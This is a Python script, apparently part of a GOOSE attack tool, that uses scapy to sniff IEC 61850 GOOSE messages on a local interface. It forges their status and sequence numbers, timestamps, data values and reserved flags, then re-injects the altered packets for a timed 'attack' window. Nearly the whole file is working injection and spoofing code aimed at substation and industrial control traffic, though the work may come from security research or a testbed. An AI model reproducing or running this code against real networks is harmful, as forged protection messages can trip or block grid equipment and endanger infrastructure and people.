import scapy.all as scapy
import logging
import time
import GAT_Main_20230712 as Main
from multiprocessing import Process, Pipe

"""Not implemented function to verify if packet is modified
def check_packet_modified(dict_tags, actual_status, new_status):
    global dict_modified
    global first_date
    aux = tuple([i for i in dict_tags if i[1] == b'\x84'])
    aux = aux[0]  # need to be better
    aux_data = tuple([i for i in dict_tags if i[1]==b'\xab'])
    aux_data = aux_data[0] #need to be better
    # print(f'First date {first_date}')
    # print(f'Check {dict_tags}\n{dict_modified.get(dict_tags[aux])}')
    # print(f'Previous and New {actual_status, new_status}')
    if(dict_modified.get(dict_tags[aux])!=None):
        if (dict_modified.get(dict_tags[aux])[0] == actual_status):
            # print(
            #     f'Checking {dict_modified.get(dict_tags[aux])} True')
            return True, dict_tags
        elif (dict_modified.get(dict_tags[aux])[0] == new_status):
            dict_tags[aux_data] = dict_modified.get(first_date)[1]
            # print(f'New {dict_tags[aux_data]}\n')
            # print(
            #     f'Checking 1 {dict_modified.get(dict_tags[aux])} False')
            return False, dict_tags
        elif(len(dict_modified.keys())>=1):
            dict_tags[aux_data] = dict_modified.get(first_date)[1]
            return False, dict_tags
    else:
        if (first_date != None):
            dict_modified.setdefault((dict_tags[aux]), [new_status,dict_modified.get(first_date)[1]])
            dict_tags[aux_data] = dict_modified.get(first_date)[1]
        elif (first_date == None):
            first_date = dict_tags[aux]
            dict_modified.setdefault((dict_tags[aux]), [new_status,dict_tags[aux_data]])
        # print(
            # f'Checking 2 {dict_modified.get(dict_tags[aux])} False')
        return False, dict_tags
"""

def sniffed(packet): #Main method
    global dst_aux
    global src_aux
    global flag
    global save_packet
    global dict_time
    global attack_time
    global current_time
    global execution_time
    global start_time
    global data_values
    global burst
    global initial_packet
    global modified_packet
    global initial_data
    global initial_status
    global aux_sequence_number

    dict_tags = {}

    check_MAC = Main.filter_MAC(packet.dst,packet.src,dst_aux,src_aux) #Verify MAC of interest

    aux_number = None

    try:
        if (check_MAC==True):
            new_load = None
            previous_load, working_load = Main.separation_load(packet) #Separate packet load
            reserved = Main.check_reserved(previous_load) #Check if reserved field is modified
            if (reserved == False):
                dict_tags = Main.dict_separation(working_load) #Classificate tags of packet
                if (attack_time == 0):
                    attack_time, dict_time = Main.interval_time(dict_tags, packet, dict_time, attack_time) #Calculate interval between packets
                    if (save_packet == 1):
                            Main.packet_capture(packet,option_selected,flag) #Save packet in pcap file
                while (attack_time != 0):
                    new_load = None
                    aux_status = tuple([i for i in dict_tags if i[1] == b'\x85'])
                    aux_status = aux_status[0]
                    actual_status = (int.from_bytes(dict_tags.get(
                        aux_status)[1:], byteorder="big")) #Get status number
                    if (aux_number == None):
                        aux_number = (int.from_bytes(dict_tags.get(
                            aux_status)[1:], byteorder="big"))+1 #Add 1 to status number
                    else:
                        aux_number = (int.from_bytes(dict_tags.get(
                            aux_status)[1:], byteorder="big"))
                    new_status = aux_number.to_bytes(
                        dict_tags.get(aux_status)[0], byteorder='big') #Convert status number value to bytes
                    aux = int.to_bytes(dict_tags.get(aux_status)[0], 1, 'big')
                    dict_tags[aux_status] = aux+new_status #Set status number
                    aux_sequence = tuple([i for i in dict_tags if i[1]==b'\x86'])
                    aux_sequence = aux_sequence[0]
                    new_sequence = aux_sequence_number.to_bytes(dict_tags.get(aux_sequence)[0], byteorder='big')
                    aux = int.to_bytes(dict_tags.get(aux_sequence)[0],1,'big')
                    dict_tags[aux_sequence]=aux+new_sequence #Set sequence number

                    """Not implemented date change"""
                    # aux_date = tuple([i for i in dict_tags if i[1] == b'\x84'])
                    # aux_date = aux_date[0]  # need to be better
                    # aux_date_change = dict_tags.get(
                    #     aux_date)[2]+1
                    # value = dict_tags[aux_date][:2] + \
                    #     aux_date_change.to_bytes(1, 'big')+dict_tags[aux_date][3:]
                    # print(f'Previous = {dict_tags[aux_date]}')
                    # dict_tags[aux_date] = value

                    if (initial_packet == None): #Set of initial variables in first iteration
                        initial_packet = packet
                        initial_status = actual_status
                        aux_data = tuple([i for i in dict_tags if i[1]==b'\xab'])
                        aux_data = aux_data[0]
                        initial_data = dict_tags.get(aux_data)
                        aux_sequence_number = 0
                        new_sequence = aux_sequence_number.to_bytes(dict_tags.get(aux_sequence)[0], byteorder='big') #new sequence number reseted to 0
                        aux = int.to_bytes(dict_tags.get(aux_sequence)[0],1,'big')
                        dict_tags[aux_sequence]=aux+new_sequence
                        aux_date = tuple([i for i in dict_tags if i[1] == b'\x84'])
                        aux_date = aux_date[0]
                        aux_date_change = dict_tags.get(
                            aux_date)[3]+0 #Change the +0 to +14 can add an hour in the date
                        value = dict_tags[aux_date][:3] + \
                            aux_date_change.to_bytes(1, 'big')+dict_tags[aux_date][4:]
                        dict_tags[aux_date] = value
                    if (initial_data != None): #Set of initial data in first iteration
                        aux_data = tuple([i for i in dict_tags if i[1]==b'\xab'])
                        aux_data = aux_data[0] 
                        dict_tags[aux_data]=initial_data
                    if (start_time == 0):
                        start_time = time.time()
                    if (current_time == 0 or (current_time-start_time) < execution_time):
                        current_time = time.time()
                        #Start preparation of multiprocessing
                        aux_data_values = (*data_values,attack_time,initial_status)
                        side_A, side_B = Pipe(duplex=True) #Define conection to multiprocessing
                        watcher = Process(target=Main.watcher_burst, args=(aux_data_values,side_B,)) #Define arguments of multiprocessing method 
                        watcher.start() #Start multiprocessing
                        at1 = time.time() #Set initial time multiprocessing
                        at2 = time.time() #Set counter time of multiprocessing
                        while((burst == [] or burst[0] == False) and at2-at1<attack_time): #Watch if burst is raised
                            if (side_A.poll(0.1)): #Waited time
                                burst = side_A.recv()
                            at2 = time.time()
                        if (burst != [] and burst[0] == True): #Burst catched
                            aux_number = (int.from_bytes(burst[1], byteorder="big"))+1 #Add 1 to status number
                            initial_status = (int.from_bytes(burst[1], byteorder="big"))
                            new_status = aux_number.to_bytes(dict_tags.get(aux_status)[0], byteorder='big')
                            aux = int.to_bytes(dict_tags.get(aux_status)[0],1,'big')
                            dict_tags[aux_status]=aux+new_status #Set new status number

                            aux_sequence = tuple([i for i in dict_tags if i[1]==b'\x86'])
                            aux_sequence = aux_sequence[0]
                            aux_sequence_number = 0 #Reset counter of sequence number
                            new_sequence = aux_sequence_number.to_bytes(dict_tags.get(aux_sequence)[0], byteorder='big') #new sequence number reseted to 0
                            aux = int.to_bytes(dict_tags.get(aux_sequence)[0],1,'big')
                            dict_tags[aux_sequence]=aux+new_sequence #Set new sequence number
                            
                            aux_date = tuple([i for i in dict_tags if i[1]==b'\x84'])
                            aux_date = aux_date[0]
                            aux = int.to_bytes(dict_tags.get(aux_date)[0], 1, 'big')
                            dict_tags[aux_date] = aux+burst[-1] #Set new date

                            aux_date_change = dict_tags.get(
                                aux_date)[3]+0 #Change the +0 to +14 can add an hour in the date
                            value = dict_tags[aux_date][:3] + \
                                aux_date_change.to_bytes(1, 'big')+dict_tags[aux_date][4:]
                            dict_tags[aux_date] = value

                        if (flag == 1):
                            previous_reserved = Main.flags_reserved(previous_load,option_selected) #Set reserved field
                            new_load = previous_reserved
                        elif (flag == 0):
                            new_load = previous_load

                        for j in dict_tags: #Encapsulate of the package
                            new_load += j[1]+dict_tags.get(j) 
                        packet.load = new_load
                        scapy.sendp(packet, iface='eno1') #Send the modify packet to the network

                        watcher.terminate() #Stop multiprocessing

                        if (save_packet == 1):
                            Main.packet_capture(packet,option_selected,flag) #Save packet in pcap file
                        if (modified_packet == None):
                            modified_packet = packet
                        current_time = time.time()
                        print(f'Elapsed time = {current_time-start_time}', flush = True)
                        burst = [] #Reset burst value
                        aux_sequence_number += 1 #Add 1 to counter sequence number
                    if ((current_time-start_time) >= execution_time):
                        raise KeyboardInterrupt

    except Exception as e:
        # print(repr(e))
        if (str(e) == "int too big to convert"):
            logging.exception('Exception')
            print(
                f'Source = {packet.src} Destination = {packet.dst} \n {packet.show}')
            time.sleep(5)
            raise
        elif (str(e) != 'type'):
            logging.exception('Exception')
            print(repr(e))
            raise
        else:
            pass


def start(values,option): #Set initial values
    global dst_aux
    dst_aux = values[0]
    global src_aux
    src_aux = values[1]
    global flag
    flag = values[2]
    global save_packet
    save_packet = values[3]
    global execution_time
    execution_time = values[4]
    global data_values
    data_values = values
    global burst
    burst = []
    global option_selected
    option_selected = option

    global initial_packet
    initial_packet = None
    global modified_packet
    modified_packet = None
    global data
    data = None
    global initial_status
    initial_status = 1
    global aux_sequence_number
    aux_sequence_number = 0

    global dict_time
    global attack_time
    global current_time
    global start_time
    
    start_time = 0
    dict_time = {}
    attack_time = 0
    current_time = 0

    scapy.sniff(iface='eno1', store = 0, lfilter=Main.filter_GOOSE, prn=sniffed, timeout = execution_time+60) #Start Scapy capture